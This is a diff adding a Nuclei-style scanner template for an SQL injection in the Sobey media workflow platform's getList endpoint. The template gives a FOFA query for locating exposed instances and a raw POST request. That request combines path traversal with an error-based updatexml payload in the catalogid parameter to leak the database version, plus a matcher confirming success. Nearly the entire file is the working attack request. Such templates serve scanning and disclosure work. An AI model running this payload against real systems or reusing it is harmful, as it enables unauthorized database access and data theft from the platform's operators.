@@ -1,0 +1,25 @@
+id: sobey-media-getlist-sqli
+
+info:
+  name: "索贝融媒体工作平台 getList 接口 catalogid 参数 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="SOBEY-融媒体"
+      索贝融媒体工作平台的 getList 接口在处理 catalogid 参数时存在SQL注入漏洞。攻击者可通过精心构造的恶意SQL语句注入到数据库查询逻辑中，导致任意SQL命令执行，进而可能获取敏感数据或操控数据库内容。
+  tags: 索贝融媒体工作平台
+
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/mch/Articlelist/queryByCode/../getList HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    catalogid=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'XPATH'
